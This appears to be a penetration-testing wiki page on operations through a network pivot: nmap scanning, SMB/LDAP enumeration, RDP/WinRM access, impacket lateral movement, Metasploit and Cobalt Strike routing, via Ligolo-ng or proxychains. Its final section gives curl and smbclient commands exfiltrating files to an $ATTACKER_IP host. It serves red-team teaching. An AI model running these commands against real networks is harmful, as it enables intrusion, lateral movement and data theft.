---
authors: felixbillieres, H4tsuM1ku
category: infra
---

# Operations through pivot

## Theory

Once a pivot is established, various operations can be performed through it, including enumeration, scanning, and exploitation of targets that are only accessible via the pivot point.

> [!NOTE]
> Before performing operations through a pivot, ensure that a pivot has been established using one of the [techniques](techniques/port-forwarding.md).

Operations through pivots include:
* Port scanning and service discovery
* Network enumeration and mapping
* Remote access to internal systems
* Lateral movement within the network
* Data exfiltration

## Practice

### Port scanning through pivot

Ports on targets accessible only through the pivot can be scanned. The method depends on the pivot type established.

::: tabs

=== Ligolo-ng

With Ligolo-ng, tools work directly without proxy configuration. The TUN interface provides transparent network access.

```bash
# Add route in Ligolo-ng proxy interface
ligolo-ng > session
ligolo-ng > ifconfig routes add 192.168.1.0/24

# Tools work directly - no proxychains needed
nmap -sn 192.168.1.0/24
nmap -sT -Pn -n $TARGET
nmap -sT -Pn -p 80,443,3389,5985 $TARGET
nmap -sV -p- $TARGET
```

> [!TIP]
> Ligolo-ng provides the best performance and tool compatibility. If Ligolo-ng is available, it should be preferred over SOCKS proxies.

=== SOCKS proxy

When using SOCKS proxy, route tools through proxychains or use nmap's `--proxies` option.

> [!WARNING]
> Host discovery (`-sn`) and OS detection (`-O`) do **not** work reliably through SOCKS proxies. These features rely on ICMP and raw sockets which cannot traverse SOCKS. Always use TCP connect scans (`-sT`) with `-Pn` (skip host discovery) and `-n` (no DNS resolution).

```bash
# Using proxychains (recommended)
# Configure /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -n $TARGET
proxychains nmap -sT -Pn -n -p 80,443,3389,5985 $TARGET
proxychains nmap -sT -Pn -n -sV -p- $TARGET

# Using nmap --proxies (alternative)
nmap --proxies socks5://127.0.0.1:1080 -sT -Pn -n $TARGET
nmap --proxies socks5://127.0.0.1:1080 -sT -Pn -n -sV -p- $TARGET
```

=== Port forwarding

Once a port forward is established (see [Port forwarding](techniques/port-forwarding.md) or [SSH tunneling](techniques/ssh-tunneling.md)), connect directly to `localhost` on the forwarded port.

```bash
# After setting up port forward, connect to localhost
rdesktop localhost:3389
curl http://localhost:8080
```

> [!NOTE]
> Port forwarding is limited to specific ports. For comprehensive scanning, use Ligolo-ng or SOCKS proxy.

:::

### Service enumeration and network mapping

Services and network topology can be enumerated through the pivot. The method depends on the pivot type.

::: tabs

=== Ligolo-ng

With Ligolo-ng, all tools work directly without proxy configuration.

```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Service enumeration
nmap -sV -p- $TARGET
nmap -O 192.168.1.0/24

# HTTP enumeration
gobuster dir -u http://$TARGET -w /path/to/wordlist.txt

# SMB enumeration
smbclient -L //$TARGET -U $USER

# LDAP enumeration
ldapsearch -x -H ldap://$TARGET -D "$DOMAIN\\$USER" -w $PASSWORD -b "DC=$DOMAIN,DC=local"
```

=== SOCKS proxy (proxychains)

When using SOCKS proxy, route tools through proxychains.

> [!WARNING]
> Host discovery (`-sn`) and OS detection (`-O`) are **not reliable** through SOCKS proxies. These require ICMP and raw sockets which cannot traverse SOCKS. For host discovery, scan from the pivot host directly or use Ligolo-ng.

```bash
# Service version detection (TCP connect only)
proxychains nmap -sT -Pn -n -sV -p- $TARGET
proxychains nmap -sT -Pn -n -p- 192.168.1.0/24

# HTTP enumeration
proxychains gobuster dir -u http://$TARGET -w /path/to/wordlist.txt

# SMB enumeration (may have issues)
proxychains smbclient -L //$TARGET -U $USER

# LDAP enumeration (may have issues)
proxychains ldapsearch -x -H ldap://$TARGET -D "$DOMAIN\\$USER" -w $PASSWORD -b "DC=$DOMAIN,DC=local"
```

:::

### Remote access through pivot

Remote systems can be accessed through the pivot using port forwarding or SOCKS proxy.

> [!NOTE]
> For port forwarding setup, see [Port forwarding](techniques/port-forwarding.md) or [SSH tunneling](techniques/ssh-tunneling.md). Once ports are forwarded, connect to `localhost` on the forwarded port.

```bash
# RDP through forwarded port (after setting up port forward)
xfreerdp /v:localhost:3389 /u:$USER /p:$PASSWORD
# Or on Windows:
mstsc /v:localhost:3389

# SSH through forwarded port
ssh -p 2222 $USER@localhost

# WinRM through SOCKS proxy
proxychains evil-winrm -i $TARGET -u $USER -p $PASSWORD
```

### Lateral movement through pivot

Lateral movement within the network can be performed using the pivot.

> [!NOTE]
> Some Active Directory tools (LDAP, SMB, WinRM) have limited or no SOCKS proxy support. [Ligolo-ng](techniques/ligolo-ng.md) is recommended for AD operations due to better protocol compatibility.

::: tabs

=== Ligolo-ng

Lateral movement tools work directly with Ligolo-ng, providing the best compatibility for AD operations.

```bash
# SMB
smbexec.py $DOMAIN/$USER:$PASSWORD@$TARGET

# WMI
wmiexec.py $DOMAIN/$USER:$PASSWORD@$TARGET

# RPC
rpcclient -U "$DOMAIN/$USER%$PASSWORD" $TARGET

# LDAP
ldapsearch -x -H ldap://$TARGET -D "$DOMAIN\\$USER" -w $PASSWORD -b "DC=$DOMAIN,DC=local"

# Kerberos tools
GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
```

=== SOCKS proxy (proxychains)

Lateral movement through SOCKS proxy requires proxychains, but some tools may not work correctly.

```bash
# SMB through proxy (may have issues)
proxychains smbexec.py $DOMAIN/$USER:$PASSWORD@$TARGET

# WMI through proxy (may have issues)
proxychains wmiexec.py $DOMAIN/$USER:$PASSWORD@$TARGET

# RPC through proxy
proxychains rpcclient -U "$DOMAIN/$USER%$PASSWORD" $TARGET

# HTTP-based tools work better
proxychains curl http://$TARGET
```

> [!WARNING]
> Some SMB/LDAP tools do not handle SOCKS proxies correctly. If tools fail, use Ligolo-ng or execute tools directly on the pivot host.

:::

### Metasploit through pivot

Use Metasploit with pivot routes.

```bash
# In meterpreter session
meterpreter > run autoroute -s 192.168.1.0/24

# Background session
meterpreter > background

# Use auxiliary modules through pivot
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.1.0/24
msf > set PORTS 80,443,3389
msf > run
```

### Cobalt Strike through pivot

Use Cobalt Strike SOCKS proxy for operations.

```bash
# In Cobalt Strike, create SOCKS proxy
beacon> socks 1080

# Configure proxychains
socks5 127.0.0.1 1080

# Use tools through proxy
proxychains nmap -sT -Pn $TARGET
```

### DNS resolution considerations

When pivoting, DNS resolution may point to incorrect addresses due to split-brain DNS or network segmentation.

```bash
# Add entries to /etc/hosts for correct resolution
echo "$TARGET_IP $TARGET_HOSTNAME" >> /etc/hosts

# Or configure DNS via proxychains (if proxy_dns enabled)
# In /etc/proxychains.conf:
# proxy_dns
```

> [!NOTE]
> Ligolo-ng handles DNS resolution more transparently through the TUN interface. With SOCKS proxies, configure `proxy_dns` in proxychains.conf or use `/etc/hosts` entries. Split-brain DNS occurs when internal and external DNS servers return different results for the same hostname.

### Data exfiltration through pivot

Data can be exfiltrated through the pivot point.

::: tabs

=== Ligolo-ng

Data exfiltration works directly with Ligolo-ng.

```bash
# HTTP upload
curl -X POST -F "file=@data.txt" http://$ATTACKER_IP/upload

# SMB copy
smbclient //$ATTACKER_IP/share -U $USER -c "put file.txt"

# SCP through SSH tunnel (if port forwarded)
scp -P 2222 file.txt $USER@localhost:/tmp/
```

=== SOCKS proxy (proxychains)

Data exfiltration through SOCKS proxy requires proxychains.

```bash
# HTTP upload through proxy
proxychains curl -X POST -F "file=@data.txt" http://$ATTACKER_IP/upload

# SMB copy through proxy
proxychains smbclient //$ATTACKER_IP/share -U $USER -c "put file.txt"
```

:::

## Resources

* [Choosing a technique](choosing-a-technique.md) - Select pivoting method
* [Techniques](techniques/port-forwarding.md) - Implementation details
* [Multi-hop pivoting](multi-hop.md) - Multi-hop scenarios
* [Persistence](persistence.md) - Maintain pivot access

